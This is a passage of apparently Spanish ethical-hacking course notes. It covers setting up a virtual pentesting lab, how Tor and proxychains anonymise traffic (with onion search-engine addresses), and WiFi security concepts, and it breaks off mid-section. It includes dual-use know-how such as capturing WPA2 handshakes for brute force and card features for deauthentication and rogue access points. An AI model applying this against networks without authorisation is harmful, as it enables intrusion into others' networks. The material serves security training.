
# **Indice**

- [Creación de un laboratorio](#-creación-de-un-laboratorio)
- [Redes Anónimas](#-redes-anónimas)
- [Seguridad de Redes Wifi](#-seguridad-de-redes-wifi)
- [Equipos de Seguridad. Pentesting vs Red Teaming](#-equipos-de-seguridad.-pentesting-vs-red-teaming)
- [Clasificación de Vulnerabilidades](#-clasificación-de-vulnerabilidades)
- [Herramientas de Seguridad y Hacking Ético](#-herramientas-de-seguridad-y-hacking-ético)
- [Generación de Identidad Falsa](#-generación-de-identidad-falsa)
- [Reconocimiento Pasivo / OSINT](#-reconocimiento-pasivo-/-osint)
- [Reconocimiento Activo](#-reconocimiento-activo)
- [Análisis y Borrado de Metadatos](#-análisis-y-borrado-de-metadatos)
- [Fase de escaneo (Fingerprinting)](#-fase-de-escaneo-(fingerprinting))
- [Fase de Explotación](#-fase-de-explotación)
- [Herramienta Metasploit y Msfvenom](#-herramienta-metasploit-y-msfvenom)
- [Técnicas de Evasión de Antivirus](#-técnicasde-evasión-de-antivirus)















# **Creación de un laboratorio**

**Virtualización**  
Una Máquina Virtual (VM) suele entenderse como una emulación de un sistema informático. Las VM se basan en arquitecturas de computadores y ofrecen la mayoría de las funcionalidades de los dispositivos físicos que emulan. Su implementación puede requerir de hardware (Ej. Instrucciones específicas del procesador) y/o software especializado (Ej. Hipervisor).

**Tipos de VM**  
Existen diferentes tipos de VM, cada una con diferentes funcionalidades: 

- **Máquinas virtuales del sistema:** También conocidas como VM de virtualización completa, permiten sustituir en la práctica un dispositivo físico. De este modo, aportan toda la funcionalidad necesaria para poder ejecutar sistemas operativos completos. Un hipervisor (hypervisor) emplea ejecución nativa para compartir y gestionar el hardware del dispositivo anfitrión (host), permitiendo la ejecución simultánea de múltiples entornos aislados entre sí en la misma máquina física. Los hipervisores modernos emplean virtualización asistida por hardware (Ej. Intel VT-x, AMD-V), la cual es suministrada generalmente por la CPU del host (Ej. VMware Workstation, VMware ESXi, Microsoft Hyper-V, Oracle VirtualBox, QEMU, Parallels Desktop).
- **Máquinas de procesos virtuales:** Estas máquinas están diseñadas para ejecutar aplicaciones en entornos independientes de la plataforma (Ej. Java Virtual Machine).

Algunas máquinas virtuales, como QEMU, están diseñadas para emular diferentes arquitecturas, lo que permite ejecutar sistemas operativos y aplicaciones escritos para otra CPU o arquitectura.

El software de virtualización se implementa mediante un hipervisor, o VMM (Virtual Machine Monitor). Consiste en una capa de abstracción entre el hardware del dispositivo físico, referido como anfitrión (host) y la VM, conformada por hardware y software virtualizado. Por tanto, funciona como un intermediario entre lo real y lo virtualizado.

**Tipos de hipervisor**

El hipervisor maneja, gestiona y arbitra los recursos principales de un ordenador (Ej. Procesador, memoria RAM, soportes de almacenamiento, NIC), lo que le permite poder repartir dinámicamente dichos recursos entre todas las VM ejecutándose concurrentemente en el dispositivo.

Existen dos tipos de hipervisores:

- **Hipervisores Tipo 1:** Este tipo de virtualización se denomina también virtualización en modo nativo o baremetal y se caracterizan por tener que instalarse el hipervisor directamente sobre el dispositivo, haciendo las funciones tanto de sistema operativo como de hipervisor. Es el tipo más empleado en entornos empresariales, donde se disponen de los recursos económicos necesarios para poder dedicar exclusivamente uno o más servidores a la virtualización de sistemas. Entre los más conocidos destacan: Microsoft Hyper-V Server, VMware ESXi, VMware ESX Server, Xen y Citrix XenServer.
- **Hipervisores Tipo 2:** Se denominan también software de virtualización alojado (hosted) y se caracterizan por tener que instalarse en un dispositivo que disponga previamente de un sistema operativo (Ej. Microsoft Windows, Linux, macOS X). Es el tipo más empleado en entornos domésticos, educativos y de laboratorio, pues resulta ideal para probar software (sistemas operativos y aplicaciones) con riesgo mínimo de afectar al host. Su rendimiento es menos eficiente que los de Tipo 1, pero permite utilizar en paralelo otras aplicaciones instaladas en el sistema operativo del host. Entre los más habituales se encuentran Oracle VirtualBox (para Microsoft Windows, Linux y macOS X), VMware Workstation y VMware Player (para Microsoft Windows y Linux), VMware Fusion (para macOS X) y Parallels Desktop (para macOS X).

La utilización de Máquinas Virtuales ofrece varias ventajas sobre los equipos dedicados:

- Se pueden utilizar simultáneamente varias Máquinas Virtuales disponiendo de un único equipo físico. Además, configurarlas es bastante sencillo: es posible cambiar la cantidad de memoria asignada, cambiar la configuración de la red, agregar discos duros virtuales y asignar más núcleos del procesador de manera gráfica.
- Las Máquinas Virtuales se pueden duplicar de manera rápida y sencilla, de manera que es posible generar varias VM nuevas con las mismas características que una ya existente. 
- Las Máquinas Virtuales se pueden exportar, tanto de manera individual como en conjunto, de modo que se puedan instalar de manera sencilla en otro equipo.
- Los sistemas de virtualización permiten tomar instantáneas del estado en que se encuentra una Máquina Virtual, de modo que se pueda revertir en caso de no querer guardar los cambios realizados o se haya producido algún problema.

Con respecto al hardware necesario para trabajar con Máquinas Virtuales, es muy recomendable disponer de un equipo con un buen procesador y con una buena cantidad de memoria RAM, sobre todo si se va a trabajar con varias Máquinas Virtuales simultáneamente. Existen diversas alternativas para virtualizar.

- VMWare Workstation.
- Hyper-V.
- VirtualBox (La que utilizaremos).

La instalación es sencilla, basta con descargar la versión adecuada para el host que se utilice y seguir los pasos indicados en el sitio web de [VirtualBox](https://www.virtualbox.org/wiki/Downloads).

**Distribuciones para Pentesting:**

- **[Kali Linux](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#):** Distribución de seguridad basada en Debian desarrollada por la empresa Offensive Security. Dispone de numerosas opciones de instalación. Tambien dispone de un enorme repositorio de paquetes donde se incluyen nuevas herramientas con cada nueva versión, Lo que facilita la instalación automatizada de estas.
- **[ParrotOS](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#):** Distribucion de seguridad basada en Debian. En 2022 comenzó una alianza con HackTheBox para mejorar su desarrollo e incluirla en la plataforma a través de la web.
- **[BlackArch](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#):** Distribución de seguridad basada en Arch Linux con mas de 2800 herramientas en sus repositorios.
- **[CommandoVM](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#):** Es un conjunto de herramientas para convertir el sistemas operativo Windows en una distribución de seguridad ofensiva. Creada por la empresa "Mandiant".

**CONFIGURACIÓN DE UNA VM OFENSIVA**

La forma más simple de preparar una máquina ofensiva es utilizar una distribución de seguridad. Una de las más extendidas es Kali Linux, que está disponible en distintos formatos. Aunque se pueden descargar Máquinas Virtuales preconfiguradas para utilizar en VMWare y VirtualBox es recomendable descargar la imagen ISO aunque el proceso sea más largo, puesto que con esta imagen se podrá instalar Kali directamente en el equipo o crear una Máquina Virtual propia, evitando futuras molestias con las redes o con las distribuciones del teclado, entre otras.

Se descargará del repositorio oficial de [Kali](https://www.kali.org/downloads/) una de las imágenes denominadas installer, de 32 o 64 bits.

- Una vez descargada la imagen ISO se creará una nueva Máquina Virtual en VirtualBox cuando se abra la ventana emergente se introducirá el nombre y el tipo de Sistema Operativo.

<div align="center">
  <img src="imagenes/Captura.png" alt="" width="485">
</div>

- En el siguiente paso se indicará la memoria RAM y la cantidad de Nucleos de Procesamiento que se quiere dar a la Máquina Virtual. La cantidad dependerá tanto de la memoria disponible y de nucleos en el host como del número de Máquinas Virtuales que se quieran utilizar de manera simultánea. Para una distribución Kali Linux de 64 bits con 2 GB y 2 Nucleos serian más que suficientes para obtener un buen rendimiento, aunque se podría recortar en caso de necesidad.

<div align="center">
  <img src="imagenes/Captura (1).png" alt="DFIR & Detection Engineering" width="485">
</div>

- En el tercer paso se indicará si se quiere utilizar un disco duro existente o crear uno nuevo. Lo normal en una instalación limpia será crear uno nuevo. Aunque VirtualBox indique que el tamaño recomendado es de 8GB, es recomendable asignar un tamaño mayor. Con 240 GB dinámicos es más que suficiente para esta distribución. El resto de las opciones se pueden dejar con sus valores por defecto.

<div align="center">
  <img src="imagenes/Captura (2).png" alt="" width="485">
</div>

<div align="center">
  <img src="imagenes/Captura (3).png" alt="" width="485">
</div>

- Una vez creada la estructura de la Máquina Virtual, es necesario configurar la red e indicar dónde se ubica la imagen ISO para la instalación.

<div align="center">
  <img src="imagenes/Captura (4).png" alt="" width="485">
</div>

<div align="center">
  <img src="imagenes/Captura (5).png" alt="" width="485">
</div>

<div align="center">
  <img src="imagenes/Captura (6).png" alt="" width="485">
</div>

<div align="center">
  <img src="imagenes/Captura (7).png" alt="" width="485">
</div>

- El siguiente paso a dar una vez finalizada la configuración de la Máquina Virtual es la instalación del sistema operativo en la misma.

**CONFIGURACIÓN DE UN LABORATORIO**

A la hora de practicar las acciones de pentesting es necesario disponer de un laboratorio con distintos equipos, de modo que se disponga de distintos Sistemas Operativos y aplicaciones con vulnerabilidades diferentes. Dado que montar un laboratorio con equipos físicos seria muy costoso y dificil de mantener, es bastante habitual optar por la virtualización, puesto que con unos recursos más limitados se puede disponer de equipos suficientes para practicar, con la ventaja añadida de que si se dañan se pueden revertir al estado inicial sin tener que reinstalarlos desde cero.

Existen plataformas que ponen a disposición del público entornos virtuales en los que practicar. Esta seria la mejor opción de cara a practicar, dado que suelen ir notando las Máquinas Virtuales con cierta regularidad y, además, algunas de ellas proporcionan laboratorios que simulan redes, de modo que se puede utilizar un equipo vulnerado para pivotar y acceder a la red interna hasta lograr tomar el control de todos los equipos. Corno inconveniente principal, estos entornos son generalmente de pago, salvo pases temporales o laboratorios reducidos, por lo que hay que habrá que considerar si el presupuesto permite optar por esta opción.

Las posibilidades son múltiples: se pueden utilizar Máquinas Virtuales independientes descargadas de internet o crear Máquinas Virtuales propias, utilizando aplicaciones y/o configuraciones vulnerables; se puede crear un laboratorio con varios equipos en una misma red para practicar los movimientos laterales o, incluso, crear un dominio Windows con su controlador de dominio y diferentes servidores y clientes. La limitación en este caso viene dada por el procesador y por la cantidad de memoria disponible en el equipo utilizado, aparte de por el presupuesto disponible para las licencias de Windows, si se opta por esta opción.

**Repositorios de máquinas vulnerables:**

- [Thehackerslabs](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#).
- [Vulnyx](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#).
- [Vulnhub](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#).
- [Dockerlabs](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#).
- [Bugbountylabs](https://www.blogger.com/blog/post/edit/9112792369491851953/2542980588050107180#).

Una vez configurado el laboratorio con la Máquina Virtual atacante y las Máquinas Virtuales vulnerables se puede comenzar a practicar.

**_¡¡¡Happy Hacking!!!_**


# **Redes Anónimas**

Como se sabe, la navegación a través de internet deja rastro. Las redes anónimas surgen con el objetivo de conseguir privacidad absoluta y una navegación plenamente anónima. Hay diversas redes anónimas; la mas conocida es **TOR** (_The Onion Router_), pero hay otras menos conocidas como **I2P** (_The Invisible Internet Project_) o **FreeNET**.

**La Red Oculta**

En los últimos años se han acuñado términos como **DeepWeb** o **DarkWeb** que en muchas ocasiones se utilizan de forma indistinta cuando representan conceptos diferentes, A menudo se emplea la imagen de un _iceberg_ para representar los distintos tipos de información que se pueden encontrar en internet.

<div align="center">
  <img src="imagenes/Deepweb_graphical_representation.png" alt="" width="485">
</div>

Los diferentes niveles representados en el _iceberg_ se relacionan con el modo en que la información está disponible.  

- **ClearNet (Surface Web):** Se refiere a todo el contenido que se encuentra disponible de manera pública en internet, o en su defecto el contenido al que se accede con algún usuario en la plataforma. En resumen, _es la parte de internet accesible por todos_.
- **DeepWeb:** Se refiere a todo el contenido privado que no se encuentra a disposición del público en general, pero que a través de la ClearNet es posible acceder a ciertos datos contenidos en ella. Por poner un ejemplo, _la Base de Datos de una tienda online se encuentra alojada en la DeepWeb, sin embargo accedes a cierta información a través de la ClearNet como los productos disponibles, precios y comentarios_.
- **DarkWeb:** Redes privadas utilizadas por los ciberdelincuentes para ofrecer sus servicios, vender información previamente robada, vulnerabilidades no reportadas a los fabricantes, etc. También existen zonas en la DarkWeb destinada a la venta de sustancias prohibidas o material no autorizado. El acceso a este tipo de redes se realiza mediante clientes de acceso a la **red Tor**. _Es una red que no es para nada confiable dado que también se producen numerosos engaños_. También _es utilizada por los cibercriminales_ a modo de red puente para intentar encubrir el origen real de las pruebas.

**Cómo funciona la red TOR**

<div align="center">
  <img src="imagenes/1366_2000.png" alt="" width="485">
</div>

Tor es una red que implementa una técnica llamada Onion Routing (enrutado cebolla en castellano), diseñada con vistas a proteger las comunicaciones en la Marina de los Estados Unidos. La idea es cambiar el modo de enrutado tradicional de Internet **para garantizar el anonimato** y la privacidad de los datos.

El enrutado tradicional que usamos para conectarnos a servidores en Internet es directo. Por ejemplo, si quieres leer una web tu ordenador se conecta de forma directa a sus servidores. **La ruta es relativamente sencilla**: de tu ordenador a tu router, de ahí a los enrutadores de tu ISP (proveedor de Internet) y después directos a los servidores de la web que estás visitando.

Lo malo es que si alguien intercepta los paquetes de datos en un punto intermedio sabrá perfectamente de dónde vienen y a dónde van. Incluso aunque se cifren los datos de cada paquete en las página HTTPS, las cabeceras de este no se cifran, y los campos del remitente y destinatario (entre otros) siguen siendo visibles.

Ahí es donde entra el Onion Routing, que consiste en **enviar los datos por un camino no directo** utilizando diferentes nodos. Primero, el ordenador A, que quiere enviar el mensaje a B, calcula una ruta más o menos aleatoria al destino pasando por varios nodos intermedios. Después, consigue las claves públicas de todos ellos usando un directorio de nodos.

Usando cifrado asimétrico, **el ordenador A cifra el mensaje como una cebolla: por capas**. Primero cifrará el mensaje con la clave pública del último nodo de la ruta, para que sólo él lo pueda descifrar. Además del mensaje, incluye (también cifradas) instrucciones para llegar al destino, B. Todo este paquete, junto con las instrucciones para llegar al último nodo de la lista, se cifra de nuevo para que sólo lo pueda descifrar el penúltimo nodo de la ruta.

<div align="center">
  <img src="imagenes/1366_2000 (1).png" alt="" width="485">
</div>
El proceso se repite hasta que acabamos con todos los nodos de la ruta. Con esto ya tenemos el paquete de datos listo, así que toca enviarlo. El ordenador A conecta con el primer nodo de la ruta, y le envía el paquete. Este nodo lo descifra, y sigue las instrucciones que ha descifrado para enviar el resto del paquete al nodo siguiente. Éste descifrará de nuevo y volverá a enviar al siguiente, y así sucesivamente. Los datos llegarán finalmente al nodo de salida, que enviará el mensaje a su destino.

Este método proporciona muchísima más seguridad y privacidad, ya que sólo el primero y el último nodo saben de dónde viene o a dónde va el mensaje. **Pero tampoco es un método infalible**, ya que analizando los tiempos a los que se reciben y envían los paquetes en cada nodo se podría llegar a saber, con mucho tiempo y dedicación, qué ordenadores se están comunicando.

Además, de cara al usuario convencional está la molestia de que **el precio a pagar por la privacidad y seguridad es la velocidad**, y las páginas de la Darknet TOR suelen cargar muchísimo más lentas que la de la clearnet.

**Uso de Tor en las comunicaciones**

Tor se puede utilizar de dos formas: para navegar por internet obteniendo la privacidad que ofrece esta red, que es lo que se conoce como navegación **outproxy**; o para acceder a los servicios ocultos disponibles solo en la red Tor (**inproxy**).

Se dispone de diversas herramientas para navegar a través de la red Tor. La principal es **Tor Browser**, que se puede descargar e instalar a traves de la web del proyecto Tor. El navegador dispone de diferentes niveles de seguridad (_Standard_, _Safer_ y _Safest_); el recomendado para navegar por la **DarkWeb** es _Safest_.

Ademas, el proyecto **Get Tor** ofrece diferentes vías de acceso para aquellas personas que tratan de conectarse desde países con censura.

Para que las conexiones utilicen Tor desde el dispositivo Android propio existe la aplicación **Orbot**. Esta aplicación crea un proxy a través del cual circulara todo el trafico de las apps del móvil. Para navegar a través de la web se dispone de la aplicación **Orfox**, que requiere tener instalado Orbot en el móvil. Ambas aplicaciones están disponibles para descargar desde Google Play.

Para hacer esto mismo en el equipo de sobremesa o portátil hay que crear un proxy _SOCKS 5_. En los sistemas Linux se dispone de las herramientas en linea de comandos **Tor Service** y **Proxychains**.

Por ultimo, si se desea que todo el trafico de los dispositivos de la red domestica circule a través de Tor y se quiere hacer de forma transparente, hay que realizar toda la configuración en el router de salida de internet. Una de las formas de hacerlo es usar un Raspberry Pi.

**Configuración de Tor Service y Proxychains en linea de comandos**

La configuración de los servicios **Tor** y **Proxychains** en linea de comandos permite que la ejecución de cualquier comando se realice a través de la red Tor, en lugar de los caminos habituales en internet. De este modo, no dejamos rastro de nuestra IP en los casos que sean necesarios.

Se instalan los dos programas a través del instalador de paquetes en Kali Linux con el siguiente comando:

```bash
sudo apt-get install tor proxychains
```

A continuación se habilita el servicio **tor.service** y se inicia.

```bash
sudo systemctl enable tor.service
sudo service tor start
```

La configuración de **proxychains** se hace a través del fichero _/etc/proxychains.conf_. Este fichero dispone de varios tipos de conexiones que se pueden configurar.

- **Dinamic_chain:** Usa los proxies en el orden en el que los hemos colocado en nuestra lista y al menos uno de ellos debe estar activo.
- **Strict_chain:** Usa los proxies en el orden en el que los hemos colocado en nuestra lista y todos deben estar activos.
- **Random_chain:** Se usará una cadena de proxies aleatorios. El valor **chain_len** se emplea en esta opción e indica el numero de proxies que se van a usar.

La opción mas segura en términos de anonimato es utilizar un circuito de proxies aleatorios si se utiliza una lista de proxies personalizada. 

Simplemente es necesario editar dicho fichero y en la sección "_ProxyList_" incluir la siguiente configuración.

```bash
[ProxyList]
socks4 127.0.0.1 9050
socks5 127.0.0.1 9050
```

En estos momentos se puede usar **proxychains** delante de cualquier comando en la shell. Por ejemplo, se puede abrir el navegador para comprobar que nuestra IP pública no se muestra al servicio remoto al que nos conectamos.

```bash
proxychains firefox www.dnsleaktest.com
```

**Buscadores en Redes Anonimas**

Los servicios de la DarkWeb están ocultos, por lo que es necesario conocer sus direcciones para poder acceder a ellas. Por suerte, hay algunos buscadores que indexan servicios de diferentes redes anónimas y que pueden consultarse a través de internet, aunque también disponen de correspondiente servicio _onion_. los mas relevantes son:

- **Ahmia:** uno de los buscadores mas conocidos para realizar búsquedas en Tor y I2P. Censura contenido ilegal, especialmente la pornografía infantil, por lo que estos resultados no se mostraran en las búsquedas. (https://ahmia.fi/).
- **The hidden Wiki:** un sitio clásico con diferentes categorías de servicios ocultos en Tor. (https://thehiddenwiki.com/).
- **Onion Search:** buscador específico para Tor. (https://onionsearch.io/).
- **Dark.Fail:** es un servicio orientado a investigadores para comprobar la veracidad online de un servicio en Tor. (https://dark.fail/).

Otros buscadores específicos que solo están accesibles desde Tor son los siguientes:

- **Haystack:** este buscador de Tor tiene indexados 260.000 servicios ocultos. (http://haystack5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion/).
- **Torch:** es uno de los buscadores mas antiguos. (http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/).

Si se desea conocer mas detalles acerca del funcionamiento de las distintas redes anónimas, se recomienda consultar el libro **DeepWeb: TOR, FreeNet & I2P - Privacidad y Anonimato**, de Daniel Echeverri Montoya (alias Adastra), Publicado por la editorial [0xWord](https://www.blogger.com/blog/post/edit/9112792369491851953/6634153855536829141#).

# **Seguridad de Redes Wifi**

**Componentes de una red inalámbrica.**

La estructura de una red inalámbrica es bastante sencilla, teniendo 3 componentes principales que describimos a continuación. Normalmente se apoya en una red de Área Local para poder dotarla de una conectividad más extensa.

- **Router**: Dispositivo que permite enrutar el tráfico entre distintas redes (Redes empresariales, Redes de Área Extensa), o para conectar las redes domésticas a internet. En redes domésticas se encuentran integrados en los propios puntos de acceso.
- **Punto de Acceso**: Dispositivos que presentan la capacidad inalámbrica y de red ethernet y se encargan de brindar acceso Wi-Fi a los clientes inalámbricos e interconectarlos con la red ethernet. En una misma red inalámbrica puede haber varios puntos de acceso.
- **Clientes inalámbricos**: Son todos aquellos dispositivos que pueden conectarse a una red inalámbrica a través de los puntos de acceso (Ordenadores, Smartphones, Tablets)
- **Antenas**: Son parte esencial del punto de acceso y le ayuda en la tarea de aumentar la cobertura de la señal inalámbrica.

**Conceptos generales en hacking ético de entornos inalámbricos.**

Existen diversos tipos de wifi, basados cada uno de ellos en un estándar IEEE 802.11. Son los siguientes:

- Los estándares IEEE 802.11b, IEEE 802.11g e IEEE 802.11n disfrutan de una aceptación internacional debido a que la banda de frecuencia 2,4 GHz está disponible casi universalmente, con una velocidad de hasta 11 Mbit/s, 54 Mbit/s y 300 Mbit/s, respectivamente. El problema es que existen otras tecnologías inalámbricas que también funcionan a una frecuencia de 2,4 GHz, como Bluetooth, por lo que pueden presentar interferencias con la tecnología wifi. Debido a esta problemática, en la versión 1.2 del estándar Bluetooth, se actualizó su especificación para que no existieran interferencias con la utilización simultánea de ambas tecnologías.
- Desde 2013 existe también el estándar IEEE 802.11ac, conocido como WIFI 5, que opera en la banda de frecuencia 5 GHz y que disfruta de una operatividad con canales relativamente limpios. La banda de 5 GHz ha sido habilitada con posterioridad a las usadas por versiones anteriores y, al no existir otras tecnologías (Bluetooth, microondas, ZigBee, WUSB) que la utilicen, se producen muy pocas interferencias. Su alcance es algo menor que el de los estándares que trabajan a 2,4 GHz (aproximadamente un 10 %), debido a que la frecuencia es mayor (a mayor frecuencia, menor alcance).
- Publicada en 2019, el estándar IEEE 802.11ax, conocido como WiFi 6 (en bandas de 2.4 GHz y 5 GHz) y también como WiFi 6E (en banda de 6 GHz). Es capaz de operar en las bandas de frecuencia de 2.4 GHz, 5 GHz y 6 GHz. Además, se logra una mejora de velocidad de un 37% más que su antecesor.

**Principales diferencias entre las bandas de frecuencia 2,4 GHz y 5GHz.**

- **2,4 GHZ:**
  - **CANALES:** 14 canales no superpuestos (1-14).
  - **INTERFERENCIAS:** Más interferencias.
  - **VELOCIDAD:** Menos velocidad de conexión.
  - **RANGO/COBERTURA DE** **RED:** Mayor rango de cobertura.
  - **ESTÁNDAR:** IEEE 802.11(B,G,N).

- **5 GHZ:**
  - **CANALES:** 25 canales no superpuestos (36-136).
  - **INTERFERENCIAS:** Menos interferencias.
  - **VELOCIDAD:** Más velocidad de conexión.
  - **RANGO/COBERTURA DE** **RED:** Menor rango de cobertura.
  - **ESTÁNDAR:** IEEE 802.11(A,N,AC).

**Tipos de redes inalámbricas.**

Existen dos grandes tipos de redes Wi-Fi "Redes Adhoc" y "Redes infraestructura". A continuación se detallan las diferencias de cada una de ellas:

**Redes Adhoc**
Dos o más dispositivos se envían los paquetes de datos de forma descentralizada, esperando que lleguen a todos y cada uno de los destinatarios sin que un punto de acceso intermedio se encargue de gestionar todo el tráfico. Todos los dispositivos implicados pactan un canal, un nombre de red, un tipo de seguridad y una clave de seguridad válida.

**Redes infraestructura**
Gobernadas y gestionadas por un dispositivo “Router” que se encarga de “construir” y, opcionalmente, anunciar la existencia de la red wifi con determinados parámetros dados de velocidad, tipo de seguridad, etc. Según los protocolos y tipo de seguridad a las mismas se catalogan en los siguientes tipos de redes:

**OPEN**
Se caracterizan por no presentar ningún tipo de contraseña de autenticación para asociarse a las mismas. Presentan dos importantes problemas de seguridad:

- Cualquier equipo puede asociarse a las redes.
- Al no disponer de contraseña el tráfico transmitido no se cifra.

Erróneamente se suele proteger este tipo de redes mediante accesos por portal cautivo, que lo único que realiza es un whitelist de las MAC de los clientes inalámbricos permitidos.

Las redes de tipo OPEN siguen siendo muy utilizadas en las redes de tipo “Invitados”

**WEP** 
Presentado en 1999, el sistema WEP fue pensado para proporcionar una confidencialidad comparable a la de una red tradicional cableada y de ahí viene su nombre, si bien, a partir de 2001, se descubrió que su seguridad era muy frágil. WEP fue desaprobado como un mecanismo de privacidad inalámbrico en 2004.

Incorpora dos niveles de protección: una clave secreta y otra de cifrado. La clave secreta son simplemente 5 o 13 caracteres que se comparten entre el punto de acceso y todos los usuarios de la red inalámbrica. Esta clave se utiliza para generar a partir de ella diferentes claves de cifrado, que son las que realmente cifran de forma única cada paquete de información enviado a la red.

Define un método para crear una clave de cifrado única para cada paquete utilizando los 5 o 13 caracteres de la clave secreta (previamente compartida), más un prefijo pseudoaleatorio que va cambiando para cada paquete.

**WPA**
WPA surgió para corregir las limitaciones del WEP.

Su variante más normal es la WPA-PSK. Usa el sistema PSK, o de clave precompartida. En él, todos los usuarios de la red inalámbrica tienen una misma contraseña wifi que el propio usuario define, de igual manera que pasaba con redes WEP.

También existe una versión WPA empresarial conocida como WPA-Enterprise. Esta ofrece seguridad adicional al obligar a identificarse con un nombre y contraseña en sistemas de autenticación especiales, como RADIUS o 802.1X.

WPA introdujo mejoras de seguridad como el hecho de que los passwords pueden estar comprendidos entre 8 y 63 caracteres de longitud, a diferencia de WEP, cuyo password era de solo 5 o 13 caracteres.

El mayor cambio fue la introducción del TKIP, que varía las claves usadas en la conexión wifi (no confundir con la contraseña wifi) cada cierto tiempo.

Aunque TKIP utiliza internamente el mismo algoritmo que WEP (RC4), construye las claves de forma diferente y más segura con respecto a WEP.

Básicamente, es la nueva manera de construir las claves únicas de cifrado de paquete derivadas de la clave wifi.

TKIP resuelve el problema de reutilización de los vectores de inicialización del cifrado WEP que ya hemos visto previamente. WEP utiliza periódicamente el mismo IV para cifrar los datos. TKIP se basa en patrones menos repetitivos y vectores más largos.

**WPA2-PSK (Personal)**
Hacen uso de clave precompartida para acceder a la red. Al utilizar todos los usuarios la misma clave, en el caso de baja de alguno de los empleados se debería modificar la clave para impedir accesos no deseados.

WPA2 surgió para corregir de manera definitiva las debilidades de los cifrados utilizados en WPA, de manera que finalmente se elimina el uso de RC4. Es el tipo de red más utilizados en la actualidad (WEP y WPA apenas se usan).

Si bien, para su versión WPA2-PSK, se mantiene la longitud entre 8 y 63 caracteres para la contraseña Wi-Fi, el cifrado AES de 128 bits pasa a reemplazar al cifrado inseguro RC4, resolviendo todos los problemas derivados de RC4, que permite adivinar determinados parámetros criptográficos mediante análisis estadístico.

Por lo que respecta a la posibilidad de romper el cifrado, de manera estadística, en estos momentos no se conoce método alguno que lo consiga, por este motivo AES se considera el cifrado más robusto y adecuado para este tipo de redes . Solamente existe la posibilidad de capturar el “4-way handshake”, que se intercambia entre el dispositivo y el punto de acceso como mecanismo de autenticación en una red WPA2 y utilizar este “4-way handshake” para realizar fuerza bruta y obtener la contraseña.

**WPA2 Enterprise**
Las redes de tipo WPA2 Enterprise se caracterizan por que cada usuario se autentica en la red con sus propias credenciales (usuario:password o certificados de cliente) para poder autenticarse en la red. De esta manera no se ha de compartir la misma contraseña de acceso entre todos los usuarios.

Acepta múltiples protocolos de autenticación para la validación de credenciales 802.1.x + EAP y se apoyan en un servidor RADIUS (Normalmente interconectado a un servidor LDAP) para realizar la autenticación.

Son capaces de proporcionar validación del punto de acceso mediante certificado de Servidor. Sin embargo, para que esta validación sea efectiva, el usuario ha de verificar que la CA con la que se emite el certificado en una “CA de confianza”.

Cada usuario dispone de unas credenciales únicas de uso personal para acceder a la red. Para la autenticación, se utilizan servidores de tipo RADIUS, que validan las credenciales de usuario y permiten o deniegan el acceso a la red está interconectado a un Directorio Activo y, en función de la respuesta, el usuario puede o no tener acceso a los medios. La autenticación mediante credenciales se puede realizar de dos formas distintas:

- **Autenticación mediante credenciales.** Es el tipo de autenticación más usada debido a su facilidad de implementación y gestión. El servidor RADIUS se interconecta con Active Directory. 
- **Autenticación mediante certificados**. Es el tipo de autenticación más segura. Dado que es necesario desplegar una infraestructura de PKI su implementación es más costosa y menos utilizada.

**Equipamiento necesario**
A la hora de realizar una auditoría Wi-Fi necesitamos disponer de cierto equipamiento específico que nos permita desarrollar las pruebas necesarias en el entorno inalámbrico. De la misma manera, será necesario disponer de ciertas herramientas desarrolladas específicamente para el análisis de este tipo de entornos.

**Tarjetas de red**
Como os podéis imaginar, será necesario utilizar tarjetas de red que cumplan los siguientes requisitos:

- Permitan esnifar tráfico (modo Monitor)
- Permitir la inyección de tráfico. (para poder inyectar tramas de gestión, replay y deautenticación)
- Permitan configurarse en modo Master (Para establecer un punto de Acceso falso)
- Soporten frecuencias de transmisión de 2,4 Ghz y 5 Ghz (Dual Band),  si nuestra antena sólo soporta la banda de los 2,4 GHz estaremos dejando de monitorizar todas las comunicaciones que se produjeran en la banda de los 5GHz (que a día de hoy es la gran mayoría)
- Preferiblemente con antenas extraíbles con la finalidad de poder acoplar antenas externas (Direccionales u Omnidireccionales) las tarjetas Wi-Fi han de permitir la extracción de las antenas para permitir el acoplamiento de antenas más potentes. Preferiblemente la tecnología a utilizar para conectar las tarjetas al equipo del auditor deberá ser USB 3.0, a día de hoy todas las tarjetas que soportan la banda de los 5GHz operan con el estándar USB 3.0. Sin embargo, tarjeta de red más antiguas que sólo soporten la banda de 2,4 GHz pueden que dispongan de USB 2.0. El estándar USB3.0 permite una mayor velocidad de transmisión entre la tarjeta inalámbrica y el equipo de auditoría y, por tanto, mayor capacidad de captura de tramas de red.

**Antenas**
Se utilizan para aumentar el rango de cobertura cuando de la red WiFi. Existen dos grandes tipos de antena.

**Direccionales:**
Emiten en una única dirección. Pueden tener ángulos de cobertura más amplios o cerrados, dependiendo de la antena. Mayor alcance de señal.

Utilizaremos este tipo de antenas en las siguientes casuísticas:

- La red a auditar se encuentra a una distancia que queda fuera de nuestro rango de cobertura o se encuentra en un área restringida.
- Desconocemos el nombre de la red a auditar, pero sí el emplazamiento, podemos utilizar las antenas direccionales para monitorizar únicamente las redes que se encuentren en una dirección específica.

**Omnidireccionales:**
Emiten la señal en todas direcciones, Menor alcance de señal.

Por regla general utilizaremos este tipo de antenas dado que son las que vienen incluidas por defecto en las tarjetas Wi-Fi. También cabe la posibilidad de utilizar antenas omnidireccionales más potentes en los siguientes supuestos:

- Tenemos un emplazamiento para realizar las pruebas pero la red es muy amplia (varios Puntos de Acceso separados) y queremos abarcar el mayor número de cobertura.
- En caso de configurar un Punto de Acceso fraudulento y queremos que tenga la mayor cobertura posible.

**Modos de operación de las tarjetas inalámbricas.**
Dependiendo de la operativa que se vaya a realizar en cada momento con la tarjeta de red (Monitorizar las comunicaciones, iniciar un Punto de Acceso, conectarse a una red WiFi) habrá que indicar a la tarjeta inalámbrica que inicie un modo específico de operación. A continuación se enumeran los distintos modos en los que se configura la tarjeta para acometer cierto rol:

